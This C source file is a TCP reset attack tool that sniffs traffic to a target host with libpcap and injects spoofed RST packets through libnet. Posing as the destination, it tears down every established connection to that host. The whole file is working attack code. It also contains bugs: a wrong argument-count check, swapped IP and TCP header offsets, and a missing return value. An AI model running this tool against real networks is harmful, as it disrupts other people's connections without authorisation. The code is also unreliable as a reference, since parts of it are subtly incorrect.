#include <libnet.h>
#include <pcap.h>
#include "hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

int main(int argc, char *argv[])
{
    struct pcap_pkthdr cap_header;
    const u_char *packet, *pkt_data;
    pcap_if_t *alldevs;
    pcap_t *pcap_handle;
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    char libnet_errbuf[LIBNET_ERRBUF_SIZE];
    char *device;
    u_long target_ip;
    libnet_t *l;


    if(argc < 1) {
        printf("Usage: %s <target IP>\n", argv[0]);
        exit(0);
    }

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            NULL,                                   /* network interface */
            libnet_errbuf);                         /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", libnet_errbuf);
        exit(EXIT_FAILURE); 
    }

    target_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);

    if (target_ip == -1)
    {
        fatal("Invalid target address");
    }

    if ((pcap_findalldevs(&alldevs, pcap_errbuf)) == -1)
    {
        fatal(pcap_errbuf);
    }

    device = alldevs->name;
    if (device == NULL)
    {
        fatal(pcap_errbuf);
    }

    pcap_handle = pcap_open_live(device, 128, 1, 0, pcap_errbuf);
    if (pcap_handle == NULL)
    {
        fatal(pcap_errbuf);
    }

    libnet_seed_prand(l);

    set_packet_filter(pcap_handle, (struct in_addr *) &target_ip);

    printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *) &l);

    pcap_close(pcap_handle);
    libnet_destroy(l);

    return 0;
}

/* Sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip)
{
    struct bpf_program filter;
    char filter_string[100];

    sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));
    printf("DEBUG: filter string is \'%s\'\n", filter_string);

    if (pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
        fatal("pcap_compile failed");
    
    if (pcap_setfilter(pcap_hdl, &filter) == -1)
        fatal("pcap_setfilter failed");
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet)
{
    u_char *pkt_data;
    struct libnet_ipv4_hdr *IPhdr;
    struct libnet_tcp_hdr *TCPhdr;
    libnet_t ** l_passed;
    int bcount;

    l_passed = (libnet_t **) user_args;

    TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H);
    IPhdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

    printf("Reseting TCP connection from %s:%d ", inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
    printf("<---> %s:%d\n", inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));

    if (libnet_build_tcp(
        htons(TCPhdr->th_dport),                // Source TCP port (pretend we are dst)
        htons(TCPhdr->th_sport),                // Destination TCP port (send back to src)
        htonl(TCPhdr->th_ack),                  // Sequence number (use previous ack)
        libnet_get_prand(LIBNET_PRu32),         // Acknowledgement number (randomized)
        TH_RST,                                 // Control flags (RST flag set only)
        libnet_get_prand(LIBNET_PRu16),         // Window size (randomized)
        0,                                      // Checksum
        0,                                      // Urgent pointer
        LIBNET_TCP_H,                           // TCP packet length
        NULL,                                   // Payload (none)
        0,                                      // Payload length
        *l_passed,                              // Libnet context
        0)                                      // Protocol tag
        == -1)
        fatal("build TCP header failed");
    
    
    if (libnet_build_ipv4(
        LIBNET_TCP_H + LIBNET_IPV4_H,           // Size of the packet sans IP header
        IPTOS_LOWDELAY,                         // IP tos
        libnet_get_prand(LIBNET_PRu16),         // IP ID (randomized)
        0,                                      // Frag stuff
        libnet_get_prand(LIBNET_PR8),           // TTL (randomized)
        IPPROTO_TCP,                            // Transport protocol
        0,                                      // Checksum
        *((u_long *) &(IPhdr->ip_dst)),         // Source IP (pretend we are dst)
        *((u_long *) &(IPhdr->ip_src)),         // Destination IP (send back to src)
        NULL,                                   // Payload (none)
        0,                                      // Payload length
        *l_passed,                              // Libnet context
        0)                                      // Protocol tag
        == -1)
        fatal("build IP header failed");

    bcount = libnet_write(*l_passed);
    if (bcount < LIBNET_IPV4_H + LIBNET_TCP_H)
        printf("Warning: incomplete package written. (%d of %d bytes)\n", bcount, LIBNET_IPV4_H + LIBNET_TCP_H);
    
    libnet_clear_packet(*l_passed);

    usleep(5000);                               // Pause slightly

}


